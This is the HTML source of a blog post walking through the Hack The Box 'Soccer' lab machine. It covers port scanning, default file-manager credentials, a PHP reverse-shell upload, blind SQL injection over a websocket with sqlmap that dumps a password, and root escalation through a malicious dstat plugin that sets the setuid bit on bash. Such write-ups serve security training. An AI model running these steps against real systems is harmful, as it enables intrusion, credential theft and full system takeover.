@@ -1,0 +1,227 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-8083932952140695"
+     crossorigin="anonymous"></script>
+    <title>HTB - Soccer [Easy] // MeowMeowAttack&#39;s security.log</title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.105.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="meowmeowattack" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://meowmeowattack.github.io/css/main.min.08c75f03335e384efd6114f8f43e0cfe7b8782f807f0ffcad6fd48c7431e850e.css" />
+
+    
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-SLVHGT13XR"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-SLVHGT13XR', { 'anonymize_ip': false });
+}
+</script>
+
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="HTB - Soccer [Easy]"/>
+<meta name="twitter:description" content="TCP Scan &gt; TARGET=10.129.88.135 &amp;&amp; nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d &#39;/&#39; -f 1 | tr &#39;\n&#39; &#39;,&#39; | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmap PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) 80/tcp open http syn-ack ttl 63 nginx 1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://soccer.htb/ |_http-server-header: nginx/1."/>
+
+    <meta property="og:title" content="HTB - Soccer [Easy]" />
+<meta property="og:description" content="TCP Scan &gt; TARGET=10.129.88.135 &amp;&amp; nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d &#39;/&#39; -f 1 | tr &#39;\n&#39; &#39;,&#39; | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmap PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) 80/tcp open http syn-ack ttl 63 nginx 1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://soccer.htb/ |_http-server-header: nginx/1." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://meowmeowattack.github.io/htb/soccer/" /><meta property="article:section" content="htb" />
+<meta property="article:published_time" content="2022-12-18T22:30:13+13:00" />
+<meta property="article:modified_time" content="2022-12-18T22:30:13+13:00" />
+
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://meowmeowattack.github.io/"><img class="app-header-avatar" src="/avatar.jpg" alt="meowmeowattack" /></a>
+      <span class="app-header-title">meowmeowattack</span>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/">/root</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/htb/">/htb</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/notes/">/notes</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/contact/">/contact</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/about/">/about</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/support/">/support</a>
+      </nav>
+      <p>MeowMeow is a pentest meow, a full of justice meow, and a nonsense-free meow. b******t, just filling this up for better SEO.</p>
+      <a style="font-size: smaller;" href="/privacy/">Privacy Policy</a>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="meowmeowattack" data-description="Support me on Buy me a coffee!" data-message="" data-color="#40DCA5" data-position="Right" data-x_margin="18" data-y_margin="18"></script>
+      <script src="/js/crypto-js.min.js"></script>
+      <script src="/js/dice.js"></script>
+      <h1 class ="post-title">HTB - Soccer [Easy]</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Dec 18, 2022
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          4 min read
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <h2 id="tcp-scan">TCP Scan</h2>
+<pre tabindex="0"><code>&gt; TARGET=10.129.88.135 &amp;&amp; nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d &#39;/&#39; -f 1 | tr &#39;\n&#39; &#39;,&#39; | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmap
+
+PORT     STATE SERVICE         REASON         VERSION
+22/tcp   open  ssh             syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+80/tcp   open  http            syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://soccer.htb/
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+9091/tcp open  xmltec-xmlmail? syn-ack ttl 63
+</code></pre><ul>
+<li>Domain: <code>soccer.htb</code></li>
+</ul>
+<h2 id="web-enum">Web Enum</h2>
+<ul>
+<li>dirsearch</li>
+</ul>
+<pre tabindex="0"><code>&gt; dirsearch -u http://soccer.htb/ -x 403,401 -w /usr/share/wordlists/dirb/big.txt
+
+[03:07:11] 301 -  178B  - /tiny  -&gt;  http://soccer.htb/tiny/
+</code></pre><ul>
+<li>There is a login form <code>H3K tiny file manager</code>. Search online for this software and found the default login: <a href="https://github.com/prasathmani/tinyfilemanager">https://github.com/prasathmani/tinyfilemanager</a></li>
+</ul>
+<pre tabindex="0"><code>admin:admin@123
+</code></pre><h2 id="foothold-www-data">Foothold: www-data</h2>
+<ul>
+<li>After logging in, you will see a file manager UI. We are able to upload a reverse shell using this facility.</li>
+<li>Browse to the <code>/tiny/uploads/</code> directory and upload a reverse shell <code>/usr/share/webshells/php/php-reverse-shell.php</code></li>
+<li>Then browse to the uploaded shell path to receive a reverse shell: <code>http://soccer.htb/tiny/uploads/w.php</code></li>
+<li>Checking the nginx file <code>/etc/nginx/sites-available/soc-player.htb</code> found a service on a subdomain <code>soc-player.soccer.htb</code></li>
+</ul>
+<pre tabindex="0"><code>server {
+        listen 80;
+        listen [::]:80;
+
+        server_name soc-player.soccer.htb;
+
+        root /root/app/views;
+
+        location / {
+                proxy_pass http://localhost:3000;
+                proxy_http_version 1.1;
+                proxy_set_header Upgrade $http_upgrade;
+                proxy_set_header Connection &#39;upgrade&#39;;
+                proxy_set_header Host $host;
+                proxy_cache_bypass $http_upgrade;
+        }
+
+}
+</code></pre><h2 id="subdomain-soc-playersoccerhtb-sqli">Subdomain: soc-player.soccer.htb, sqli</h2>
+<ul>
+<li>Browse to <code>http://soc-player.soccer.htb/signup</code> and create an account, then login.</li>
+<li>After login, you are presented with the page <code>http://soc-player.soccer.htb/check</code>. There is a ticket checking mechanism where you can search for a ticket. Inspecting the html source found that this feature connects to a websocket</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">ws</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">WebSocket</span>(<span style="color:#e6db74">&#34;ws://soc-player.soccer.htb:9091&#34;</span>);
+</span></span></code></pre></div><ul>
+<li>So, very likely there could be a sqli vulnerability. Search online for <code>sqli websocket</code> lead to this post: <a href="https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html">https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html</a></li>
+<li>Basically, we can use the python script in the post as a proxy that forwards sqlmap requests to localhost:8081 (as it&rsquo;s defined in the python script) to the target host&rsquo;s websocket port 9091. To make our setup work, we need to change the script with the following settings</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>ws_server <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;ws://soc-player.soccer.htb:9091&#34;</span> <span style="color:#75715e"># line: 6</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span>data <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;{&#34;id&#34;:&#34;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;}&#39;</span> <span style="color:#f92672">%</span> message <span style="color:#75715e"># line: 15, this format can be found by inspecting the traffic and see the search response</span>
+</span></span></code></pre></div><ul>
+<li>Save the script as <code>sqli.py</code>, to exploit</li>
+</ul>
+<pre tabindex="0"><code># terminal 1
+&gt; python3 sqli.py
+
+# terminal 2
+&gt; sqlmap -u &#34;http://localhost:8081/?id=1&#34; -p &#34;id&#34;
+</code></pre><ul>
+<li>This process can take a very long time. But eventually, you&rsquo;ll get the username and password. Login via ssh to get the user flag.</li>
+</ul>
+<pre tabindex="0"><code>[04:40:38] [INFO] GET parameter &#39;id&#39; appears to be &#39;MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)&#39; injectable
+
++------+-------------------+----------+----------------------+
+| id   | email             | username | password             |
++------+-------------------+----------+----------------------+
+| 1324 | player@player.htb | player   | PlayerOftheMatch2022 |
++------+-------------------+----------+----------------------+
+</code></pre><h2 id="pe-root">PE: root</h2>
+<ul>
+<li>Upload linpeas and perform enum, note the followings</li>
+</ul>
+<pre tabindex="0"><code>[+] Checking doas.conf
+permit nopass player as root cmd /usr/bin/dstat 
+</code></pre><ul>
+<li>So from the <code>doas</code> configure, it seems that we can run <code>/usr/bin/dstat</code> as root. This can help us to PE</li>
+<li>From reading <code>https://linux.die.net/man/1/dstat</code>, dstat can be used to monitor and view system resources. And it supports customised plugins. Therefore, we can create a malicious plugin that executes our code then run dstat with root privielge. See the following example</li>
+</ul>
+<pre tabindex="0"><code>Files
+Paths that may contain external dstat_*.py plugins:
+
+~/.dstat/
+(path of binary)/plugins/
+/usr/share/dstat/
+/usr/local/share/dstat/
+</code></pre><ul>
+<li>Search to locate <code>dstat</code> directory</li>
+</ul>
+<pre tabindex="0"><code>player@soccer:~$ find / -type d -name dstat 2&gt;/dev/null
+/usr/share/doc/dstat
+/usr/share/dstat
+/usr/local/share/dstat
+</code></pre><ul>
+<li>Create a plugin called <code>dstat_meow.py</code> with the following content under <code>/usr/local/share/dstat/</code></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">import</span> os
+</span></span><span style="display:flex;"><span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#39;chmod +s /usr/bin/bash&#39;</span>)
+</span></span></code></pre></div><ul>
+<li>Then run <code>dstat</code> with root to trigger the plugin to get root</li>
+</ul>
+<pre tabindex="0"><code># check if the plugin can be detected
+&gt; dstat --list | grep meow
+
+# run the exploit
+player@soccer:/usr/local/share/dstat$ doas -u root /usr/bin/dstat --meow
+/usr/bin/dstat:2619: DeprecationWarning: the imp module is deprecated in favour of importlib; see the module&#39;s documentation for alternative uses
+  import imp
+Module dstat_meow failed to load. (name &#39;dstat_plugin&#39; is not defined)
+None of the stats you selected are available.
+player@soccer:/usr/local/share/dstat$ bash -p
+bash-5.0# id
+uid=1001(player) gid=1001(player) euid=0(root) egid=0(root) groups=0(root),1001(player)
+bash-5.0# cat /root/root.txt 
+</code></pre>
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
